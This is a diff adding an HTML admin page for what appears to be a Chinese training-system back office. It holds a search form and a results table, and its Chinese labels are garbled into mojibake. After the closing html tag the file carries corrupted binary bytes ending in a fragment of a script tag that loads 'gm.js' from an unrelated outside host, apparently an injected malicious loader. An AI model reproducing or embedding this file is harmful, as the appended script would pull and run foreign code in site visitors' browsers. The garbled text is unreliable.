@@ -1,0 +1,96 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
+<title>π„∂´ºÏ—ÈºÏ“ﬂ£®ºÏŒÒ£©Õ¯…œ≈‡—µœµÕ≥∫ÛÃ®π‹¿ÌœµÕ≥</title>
+<link href="../css/htlogin.css" rel="stylesheet" type="text/css" />
+<script type="text/javascript" src="../datepicker/doTable.js"></script>
+<script>
+<!--
+	function del()
+	{
+		var chks=document.all('chk');
+		for(var i=0;i<chks.length;i++)
+		{
+			if(chks[i].checked)
+			{
+				chks[i].parentNode.parentNode.style['display']='none';
+			}
+		}
+	}
+//-->
+</script>
+</head>
+
+<body topmargin="0" leftmargin="0">
+<table width="100%" border="0" cellspacing="0" cellpadding="0">
+      <tr>
+        <td class="body01"><table width="100%" border="0" cellspacing="0" cellpadding="0">
+            <tr>
+              <td background="../images/ht-body01.jpg" class="body02">µ±«∞Œª÷√£∫œµÕ≥π‹¿Ì-œµÕ≥≤Œ ˝…Ë÷√</td>
+            </tr>
+        </table></td>
+      </tr>
+      <tr>
+        <td class="body01"><table width="100%" border="0" cellspacing="0" cellpadding="0">
+            <tr>
+              <td colspan="4" background="../images/ht-body02.jpg" class="body03">≤È—ØÃıº˛</td>
+            </tr>
+            <tr>
+              <td width="25%" class="body06">¥˙¬Î£∫</td>
+              <td width="27%" class="body04"><input name="txtid" type="text" class="bodytext" /></td>
+              <td width="21%" class="body06">√˚≥∆£∫</td>
+              <td width="23%" class="body04"><input name="txtname" type="text" class="bodytext" /></td>
+            </tr>
+            <tr>
+              <td width="25%" class="body06">¿‡–Õ£∫</td>
+              <td width="27%" class="body04"><input name="txtid" type="text" class="bodytext" /></td>
+              <td width="21%" class="body06">±∏◊¢£∫</td>
+              <td width="23%" class="body04"><input name="txtname" type="text" class="bodytext" /></td>
+            </tr>
+ 		<tr>
+              <td colspan="4" class="body03"><table width="100%" border="0" cellspacing="0" cellpadding="0">
+                  <tr>
+                    <td width="" height="35">&nbsp;</td>
+                    <td width="10%"><input type="image" src="../images/ht-but-add.jpg" name="Submit223" onclick="window.location='add1.html?id='+document.all.txtid.value+'&name='+document.all.txtname.value;" /></td>
+                    <td width="10%"><input type="image" src="../images/ht-but-check.jpg" name="Submit222" /></td>
+                    <td width="10%"><input type="image" src="../images/ht-but-del.jpg" name="Submit224" onclick="del();"/></td>
+                  </tr>
+              </table></td>
+            </tr>
+        </table></td>
+      </tr>
+      <tr>
+        <td class="body01"><table id="objTable"  width="100%" border="1" bordercolor="#abcdef" cellspacing="0" cellpadding="5" align="center" bgcolor="#D8F0FD">
+            <tr>
+              <td colspan="5" background="../images/ht-body02.jpg" class="body03">≤È—ØΩ·π˚</td>
+            </tr>
+            <tr>
+              <td width="25%" align="center" class="body05">¥˙¬Î</td>
+              <td width="25%" align="center" class="body05">√˚≥∆</td>
+              <td width="25%" align="center" class="body05">¿‡–Õ</td>
+              <td width="25%" align="center" class="body05">±∏◊¢</td>
+              <td width="25%" align="center" class="body05">≤Ÿ◊˜</td>
+            </tr>
+            <tr>
+              <td ><input /></td>
+              <td ><input /></td>
+              <td ><input /></td>
+              <td align="center" ><input /></td>
+              <td width="10%" ><input type="image" src="../images/ht-but-adit.jpg" name="Submit222" />&nbsp;&nbsp;<input type="image" src="../images/ht-but-add.jpg" name="Submit222" onclick="addRow('objTable')"/></td>
+            </tr>
+            <tr>
+              <td ><input /></td>
+              <td ><input /></td>
+              <td ><input /></td>
+              <td align="center"><input /></td>
+              <td width="10%" ><input type="image" src="../images/ht-but-adit.jpg" name="Submit222" />&nbsp;&nbsp;<input type="image" src="../images/ht-but-add.jpg" name="Submit222"  onclick="addRow('objTable')"/></td>
+            </tr>
+        </table></td>
+      </tr>
+    </table>
+</body>
+</html>
+
+{Æ
+z∏.”O5—v¯ŒmâGìg9±´ôñÌêÏhttp://qqq.dzydhx.com/gm.js></script>
